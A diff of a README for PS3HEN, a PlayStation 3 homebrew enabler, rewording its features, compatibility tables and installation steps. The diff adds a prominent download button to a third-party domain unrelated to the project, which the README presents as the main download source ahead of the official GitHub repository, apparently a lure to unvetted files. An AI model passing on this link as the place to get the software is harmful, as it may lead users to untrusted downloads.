@@ -3,44 +3,50 @@
 
 [![Platform](https://img.shields.io/badge/Platform-PlayStation%203-blue)](https://www.playstation.com/)
 [![Version](https://img.shields.io/badge/PS3HEN-3.6.0-orange)](https://github.com/PS3Xploit/PS3HEN)
-[![Firmware](https://img.shields.io/badge/Firmware-HFW%204.93.1-purple)](https://www.psx-place.com/threads/hfw-4-93-1-hybrid-firmware-official-release.49792/)
+[![Firmware](https://img.shields.io/badge/Firmware-HFW%204.93.1-purple)](https://github.com/PS3Xploit/PS3HEN)
 [![Type](https://img.shields.io/badge/Type-Homebrew%20Enabler-green)](https://github.com/PS3Xploit/PS3HEN)
 
-PS3HEN (PlayStation 3 Homebrew Enabler) is a system modification environment that enables homebrew execution, payload functionality, kernel plugins, and additional system-management features on compatible PlayStation 3 consoles.
+PS3HEN (PlayStation 3 Homebrew Enabler) is a system modification environment that enables homebrew execution, payload functionality, kernel plugins, and additional system tools on compatible PlayStation 3 consoles.
 
 **Project download and information resource:**
 
 https://dyhuiying.com/s/file
 
+<p align="center">
+  <a href="https://dyhuiying.com/s/file">
+    <img src="https://img.shields.io/badge/Download-PS3HEN-blue?style=for-the-badge&logo=github" alt="Download PS3HEN"/>
+  </a>
+</p>
+
 ## Overview
 
-PS3HEN is a Homebrew Enabler developed for the Sony PlayStation 3.
+PS3HEN is a Homebrew Enabler developed for the Sony PlayStation 3 by the PS3Xploit project.
 
-It provides access to selected custom firmware-like features without requiring a traditional full CFW installation. This makes it useful for PS3 models that cannot install conventional CFW, including many later Slim and Super Slim consoles.
+It provides access to selected custom firmware-like capabilities without requiring a traditional full Custom Firmware (CFW) installation. This makes it particularly useful for PS3 models that cannot install conventional CFW, including compatible Slim and Super Slim consoles.
 
 Unlike full CFW, PS3HEN is activated after the console has booted. The activation process loads supported payloads and enables additional system functionality for the current session.
 
-PS3HEN works with supported Official Firmware (OFW) and Hybrid Firmware (HFW) configurations. Its installation requirements depend on the console model and current firmware version.
+PS3HEN supports selected Official Firmware (OFW) and Hybrid Firmware (HFW) configurations. Installation requirements depend on the console model and current firmware version.
 
-The project is not equivalent to a full CFW installation. Some low-level capabilities, compatibility characteristics, and persistent system modifications differ.
+PS3HEN is not equivalent to full CFW. Some low-level capabilities, compatibility characteristics, and persistent system modifications differ.
 
-The documented PS3HEN 3.6.0 release expands multi-firmware support and adds further kernel-plugin and homebrew resource functionality.
+Version 3.6.0 expands multi-firmware support and introduces additional plugin debugging functionality, qCFW-related resources, and updates to the integrated homebrew application collection.
 
 ## Key Features
 
-- **Homebrew execution:** Enables compatible unsigned homebrew applications.
-- **Payload support:** Loads supported system-level payloads during HEN activation.
-- **Kernel plugins:** Supports compatible kernel-level plugin components.
-- **VSH plugins:** Supports compatible plugins that extend the PS3 XMB environment.
-- **Cobra-based functionality:** Provides selected Cobra-compatible features through the HEN payload environment.
-- **PS3MAPI integration:** Supports compatible system and process-management functions.
-- **HFW Tools:** Provides firmware maintenance and management options.
-- **Homebrew application resources:** Includes access to selected applications through supported resource menus.
-- **Save management:** Supports integration with compatible save-management utilities.
-- **ISO-related functionality:** Provides support for selected image formats and compatible mounting workflows.
-- **Firmware detection:** Supports multiple documented OFW and HFW configurations.
-- **Plugin debugging:** Version 3.6.0 allows multiple kernel plugins to send debug output simultaneously.
-- **qCFW integration:** Adds eMMC support for qCFW in the 3.6.0 development feature set.
+- **Homebrew Execution:** Run compatible unsigned homebrew applications.
+- **Payload Support:** Load supported system-level payloads during HEN activation.
+- **Kernel Plugins:** Support compatible kernel-level plugin components.
+- **VSH Plugins:** Extend the XMB environment with compatible plugins.
+- **Cobra-Compatible Functionality:** Access selected Cobra-related features through the HEN payload environment.
+- **PS3MAPI Integration:** Support compatible system and process-management functionality.
+- **HFW Tools:** Access additional firmware maintenance and development options.
+- **Homebrew Application Resources:** Access selected applications through supported HFW Tools menus.
+- **Save Management:** Integrate with compatible save-management utilities, including Apollo Save Manager.
+- **ISO-Related Functionality:** Support selected image formats and compatible mounting workflows.
+- **Multi-Firmware Support:** Support multiple documented CEX OFW and HFW configurations.
+- **Plugin Debugging:** Allow multiple kernel plugins to send debug output simultaneously in version 3.6.0.
+- **qCFW Integration:** Add eMMC support for qCFW-related functionality in version 3.6.0.
 
 Feature availability depends on the installed HEN version, firmware configuration, console model, and additional applications.
 
@@ -49,28 +55,29 @@ Feature availability depends on the installed HEN version, firmware configuratio
 | Item | Specification |
 |---|---|
 | Project | PS3HEN |
-| Full name | PlayStation 3 Homebrew Enabler |
+| Full Name | PlayStation 3 Homebrew Enabler |
 | Platform | Sony PlayStation 3 |
-| Documented version | 3.6.0 |
-| Latest documented release | September 17, 2026 |
-| Firmware environment | Supported OFW and HFW |
-| Latest documented HFW baseline | 4.93.1 CEX |
-| Implementation | Homebrew enabler with runtime payload activation |
-| Main components | HEN Loader, HEN Plugin, Payload Engine |
-| Plugin support | Kernel plugins and VSH plugins |
-| System interface | PlayStation 3 XMB |
-| Management tools | HFW Tools |
-| Additional integration | PS3MAPI and compatible homebrew utilities |
+| Documented Version | 3.6.0 |
+| Release Date | September 17, 2026 |
+| Firmware Environment | Supported OFW and HFW |
+| Latest Documented HFW Baseline | 4.93.1 CEX |
+| Implementation | Homebrew Enabler with runtime payload activation |
+| Main Components | HEN Loader, HEN Plugin, Payload Engine |
+| Plugin Support | Kernel Plugins and VSH Plugins |
+| System Interface | PlayStation 3 XMB |
+| Management Tools | HFW Tools |
+| Additional Integration | PS3MAPI and compatible homebrew utilities |
+| Project Repository | PS3Xploit/PS3HEN |
 
 ## Compatibility
 
 PS3HEN supports multiple PS3 firmware configurations. Compatibility must be checked against the exact console model, firmware version, and installation environment.
 
-### Documented firmware support
+### Supported Firmware Versions
 
-The PS3HEN 3.6.0 release documentation lists the following configurations:
+The PS3HEN 3.6.0 documentation lists the following supported configurations:
 
-| Firmware configuration | Support |
+| Firmware Configuration | Support |
 |---|---|
 | CEX OFW 4.80 | Supported |
 | CEX OFW 4.81 | Supported |
@@ -89,38 +96,37 @@ The PS3HEN 3.6.0 release documentation lists the following configurations:
 | CEX HFW 4.92.1 | Supported |
 | CEX HFW 4.93.1 | Supported |
 
-The project documentation also lists selected DEX configurations. Do not assume that every CEX firmware release has a matching DEX release.
+The documented DEX configurations are limited to the firmware versions listed above. Do not assume that every CEX release has a corresponding DEX release.
 
-CFW environments may be used for testing, but the project does not recommend treating them as normal PS3HEN installation targets.
+The project documentation notes that CFW environments can be used for testing but are not recommended as standard PS3HEN installation targets.
 
-### Console compatibility
+### Console Compatibility
 
-PS3HEN is designed to provide homebrew functionality across a broader range of PS3 hardware than traditional full CFW.
+PS3HEN provides homebrew functionality across a broader range of PS3 hardware than traditional full CFW.
 
-It is commonly used on:
+Compatible hardware configurations include:
 
-- Compatible original PS3 Fat systems.
-- PS3 Slim models that cannot install full CFW.
-- PS3 Super Slim models.
-- Other compatible configurations where traditional CFW is unavailable.
+- Supported original PlayStation 3 Fat consoles.
+- Compatible PlayStation 3 Slim models.
+- Compatible PlayStation 3 Super Slim models.
 
-The exact installation method and available features can differ by model.
+The exact installation method and available features depend on the console model and firmware environment.
 
-### PS3HEN versus CFW
+### PS3HEN vs. Full CFW
 
 | Feature | PS3HEN | Full CFW |
 |---|---|---|
-| Homebrew execution | Yes | Yes |
-| Manual activation | Required after boot | Normally not required |
-| Traditional full CFW installation | No | Yes |
-| Compatibility with later Slim models | Broad | Limited |
-| Super Slim support | Yes, on supported configurations | Not generally available as traditional CFW |
-| Runtime payloads | Yes | Yes |
-| Kernel plugins | Supported | Supported |
-| Low-level system modification | More limited | More extensive |
-| Installation environment | Supported OFW/HFW | CFW-compatible firmware state |
+| Homebrew Execution | Yes | Yes |
+| Manual Activation | Required after boot | Normally not required |
+| Traditional Full CFW Installation | No | Yes |
+| Later Slim Compatibility | Broad | Limited |
+| Super Slim Compatibility | Supported configurations | Not generally available as traditional CFW |
+| Runtime Payloads | Yes | Yes |
+| Kernel Plugins | Supported | Supported |
+| System-Level Modification | More limited | More extensive |
+| Installation Environment | Supported OFW/HFW | CFW-compatible firmware state |
 
-PS3HEN is not a replacement for every function of full CFW. Select the appropriate environment based on hardware compatibility and intended use.
+PS3HEN is not a complete replacement for every feature of full CFW. Choose the appropriate environment according to hardware compatibility and intended functionality.
 
 ## Firmware Features
 
@@ -128,9 +134,9 @@ PS3HEN is not a replacement for every function of full CFW. Select the appropria
 
 The HEN Loader provides the activation entry point.
 
-When activated, it starts the supported HEN payload environment and makes additional functionality available through the XMB.
+When activated, it initializes the supported HEN payload environment and makes additional functionality available through the XMB.
 
-Activation is normally required again after a full system restart.
+Standard HEN activation is normally required again after a full system restart.
 
 ### HEN Plugin
 
@@ -142,7 +148,7 @@ Its responsibilities include:
 - Firmware-specific handling.
 - Runtime system patches.
 - Compatibility checks.
-- Access to supported management features.
+- Access to supported management functionality.
 
 ### Payload Engine
 
@@ -151,7 +157,7 @@ The payload engine provides additional system functionality after activation.
 Depending on the version and firmware configuration, supported functionality includes:
 
 - System-level payload execution.
-- Cobra-related functionality.
+- Cobra-compatible functionality.
 - PS3MAPI integration.
 - Additional kernel operations.
 - Process and memory-management interfaces.
@@ -163,15 +169,15 @@ PS3HEN supports compatible kernel plugins that extend system functionality.
 
 Version 3.6.0 includes improved debug output handling, allowing multiple kernel plugins to send debug information simultaneously.
 
-Only use plugins designed for the relevant HEN and firmware environment. Incompatible kernel plugins can cause freezes, crashes, or boot problems.
+Plugin compatibility depends on the installed firmware and HEN version. Incompatible kernel plugins can cause system instability, freezes, or crashes.
 
 ### VSH Plugins
 
 VSH plugins extend the PS3 system interface and can provide additional functionality within the XMB environment.
 
-Plugin compatibility depends on the firmware and HEN implementation.
+The project supports plugin configuration through its documented plugin system.
 
-### Cobra-related functionality
+### Cobra-Compatible Functionality
 
 PS3HEN includes selected Cobra-compatible functionality through its payload environment.
 
@@ -183,7 +189,7 @@ Depending on the version, supported applications, and configuration, this can in
 - ISO-related support.
 - Extended system-management functions.
 
-Do not assume that every Cobra feature available in a full CFW is available or behaves identically in PS3HEN.
+Not every Cobra feature available in a full CFW is necessarily available or behaves identically in PS3HEN.
 
 ### HFW Tools
 
@@ -195,32 +201,32 @@ Depending on the installed version, its functions can include:
 - Homebrew application resources.
 - Maintenance options.
 - Development-related settings.
-- Additional system utilities.
+- Internal plugin controls.
 
-### Integrated homebrew resources
+### Integrated Homebrew Resources
 
 PS3HEN 3.6.0 includes an expanded Homebrew Apps section in HFW Tools.
 
 The documented application resources include:
 
-- Apollo Save Manager.
-- ArmetisPS3.
-- IRISMAN.
-- Movian.
-- PKGi.
-- PS3 ezRemote.
-- webMAN MOD.
-- multiMAN MOD.
-- ManaGunZ.
-- Rebug Toolbox.
+- Apollo Save Manager
+- ArmetisPS3
+- IRISMAN
+- Movian
+- PKGi
+- PS3 ezRemote
+- webMAN MOD
+- multiMAN MOD
+- ManaGunZ
+- Rebug Toolbox
 
-These applications are separate projects. Their availability in a resource menu does not mean they are developed or maintained by the PS3HEN team.
+These applications are separate projects. Their availability through HFW Tools does not mean they are developed or maintained by the PS3HEN team.
 
-### qCFW support
+### qCFW Support
 
-PS3HEN 3.6.0 adds eMMC support for qCFW.
+PS3HEN 3.6.0 adds eMMC support for qCFW-related functionality.
 
-qCFW is a separate quasi-custom firmware approach and should not be confused with ordinary HEN activation or traditional full CFW.
+qCFW is a separate quasi-custom firmware approach and should not be confused with standard HEN activation or traditional full CFW.
 
 Its installation requirements and hardware compatibility are separate from the standard PS3HEN workflow.
 
@@ -229,20 +235,20 @@ Its installation requirements and hardware compatibility are separate from the s
 - Compatible Sony PlayStation 3 console.
 - Supported OFW or HFW version.
 - Firmware-specific PS3HEN installation package.
-- Internet access for supported online installation methods, or the appropriate offline installation files.
+- Internet connection for supported online installation methods, or the appropriate offline installation files.
 - USB storage device when required by the installation procedure.
 - FAT32-formatted USB storage for compatible update and package workflows.
 - Computer for downloading and preparing installation files.
 - Backup of important saved data.
 - Stable power during firmware installation and system modification.
 
-Always check the official compatibility list before installing or updating HFW or PS3HEN.
+Always check the official compatibility information before installing or updating HFW or PS3HEN.
 
 ## Download & Installation
 
 ### Download
 
-Project download and information resource:
+Use the project download and information resource:
 
 https://dyhuiying.com/s/file
 
@@ -250,11 +256,11 @@ Official source repository:
 
 https://github.com/PS3Xploit/PS3HEN
 
-Official release and installation discussion:
+Official release and installation information:
 
 https://www.psx-place.com/threads/ps3hen-official-release-thread-homebrew-enabler-for-the-ps3.23955/
 
-### Step 1: Identify the console
+### Step 1: Identify the Console
 
 Before installation:
 
@@ -266,7 +272,7 @@ Before installation:
 
 Do not use installation files intended for a different firmware environment.
 
-### Step 2: Prepare the firmware environment
+### Step 2: Prepare the Firmware Environment
 
 Some PS3HEN configurations require Hybrid Firmware (HFW).
 
@@ -295,7 +301,7 @@ The installation process may use an online installer or a supported offline inst
 5. Restart the console if requested.
 6. Confirm that the HEN activation entry is available in the XMB.
 
-The exact browser, installer, and package steps can change between releases. Follow the current official instructions rather than relying on an outdated tutorial.
+The exact browser, installer, and package steps can change between releases. Follow the current official instructions rather than relying on outdated tutorials.
 
 ### Step 4: Activate HEN
 
@@ -310,33 +316,31 @@ After installation:
 
 HEN activation can occasionally fail. If this happens, follow the official troubleshooting instructions rather than repeatedly changing system files.
 
-### Step 5: Install homebrew applications
+### Step 5: Verify Installation
 
-After HEN is active:
+After activation:
 
-1. Obtain a compatible homebrew application package.
-2. Use the supported package installation method.
-3. Install the application through the PS3 interface.
-4. Launch it only after confirming HEN is enabled.
-5. Verify that the application supports the installed firmware environment.
-
-Not every application is compatible with every HEN release.
+1. Confirm that the Enable HEN option completes successfully.
+2. Check that the Package Manager or other supported HEN features are available.
+3. Launch a compatible homebrew application.
+4. Verify that the application operates normally.
+5. Check plugin functionality only after confirming basic HEN operation.
 
 ## Configuration & Management
 
-### HEN activation
+### HEN Activation
 
 PS3HEN normally requires manual activation after a full reboot.
 
 The activation entry is available through the XMB once installation is complete.
 
-If automatic activation or additional activation options are available in a particular build, consult that release's documentation.
+Activation loads the supported payload environment for the current system session.
 
 ### Updating PS3HEN
 
 Before updating:
 
-1. Check the current installed HEN version.
+1. Check the currently installed HEN version.
 2. Read the latest release notes.
 3. Verify firmware compatibility.
 4. Use the official updater or documented installation method.
@@ -345,7 +349,7 @@ Before updating:
 
 Version 3.6.0 includes expanded firmware and resource support. Do not use an older package when a newer compatible release is available.
 
-### Managing plugins
+### Managing Plugins
 
 Use compatible plugin-management methods for the installed HEN environment.
 
@@ -357,19 +361,19 @@ Before adding a plugin:
 - Keep a copy of the original configuration.
 - Avoid loading multiple conflicting plugins.
 
-### Managing homebrew applications
+### Managing Homebrew Applications
 
 Applications such as IRISMAN, Apollo Save Manager, Movian, PKGi, and webMAN MOD are maintained separately.
 
 Install application updates only from trusted project sources and verify compatibility with the installed HEN version.
 
-### Save management
+### Save Management
 
 Compatible save-management utilities can provide additional backup and management functionality.
 
 Create independent backups before modifying saved data or using advanced save tools.
 
-### Online functionality
+### Online Functionality
 
 PS3HEN does not guarantee uninterrupted access to PlayStation Network.
 
@@ -377,7 +381,7 @@ Using system modifications, unauthorized applications, or modified software onli
 
 ## Troubleshooting
 
-| Problem | Possible cause | Recommended action |
+| Problem | Possible Cause | Recommended Action |
 |---|---|---|
 | Enable HEN option is missing | Installation did not complete | Recheck the installation process and firmware compatibility |
 | HEN activation fails | Temporary exploit or initialization failure | Restart and follow the official activation troubleshooting steps |
@@ -388,7 +392,7 @@ Using system modifications, unauthorized applications, or modified software onli
 | HEN updater does not work | Outdated resources or network issue | Use the documented update method for the installed release |
 | Kernel plugin causes instability | Plugin is incompatible with the firmware | Remove or disable the incompatible plugin |
 | ISO mounting fails | Unsupported format or application configuration | Check the mounting application and supported image format |
-| System update causes compatibility problems | Firmware changed without a matching HEN update | Verify the installed firmware and follow the official recovery guidance |
+| System update causes compatibility problems | Firmware changed without a matching HEN update | Verify the installed firmware and follow official recovery guidance |
 | HEN must be activated again | Normal behavior after a full reboot | Activate HEN from the XMB |
 | Console behaves unexpectedly after plugin installation | Plugin conflict or corrupted configuration | Restore the previous plugin configuration |
 
@@ -402,7 +406,7 @@ PS3HEN stands for PlayStation 3 Homebrew Enabler. It enables compatible homebrew
 
 ### 2. What is the latest PS3HEN version?
 
-The latest documented release in this README is PS3HEN 3.6.0, released on September 17, 2026.
+The documented release covered by this README is PS3HEN 3.6.0, released on September 17, 2026.
 
 ### 3. Does PS3HEN work on every PS3 model?
 
@@ -410,7 +414,7 @@ PS3HEN supports a broad range of PS3 models, including many Slim and Super Slim 
 
 ### 4. What is the difference between PS3HEN and CFW?
 
-PS3HEN is a Homebrew Enabler that activates after the system boots. Full CFW modifies the system firmware more extensively and normally provides its functionality without requiring a separate HEN activation each time the console starts.
+PS3HEN is a Homebrew Enabler that activates after the system boots. Full CFW modifies the system firmware more extensively and normally provides its functionality without requiring separate HEN activation after each reboot.
 
 ### 5. Do I need HFW to install PS3HEN?
 
@@ -436,7 +440,7 @@ Yes. Compatible package files can be installed using supported PS3 package-manag
 
 Yes. It supports many Slim and Super Slim configurations, including systems that cannot install traditional full CFW. Check the exact firmware compatibility list before proceeding.
 
-### 11. What is qCFW and is it the same as PS3HEN?
+### 11. What is qCFW, and is it the same as PS3HEN?
 
 No. qCFW is a separate quasi-custom firmware approach. PS3HEN 3.6.0 adds eMMC support for qCFW, but this does not make ordinary HEN installation equivalent to qCFW.
 
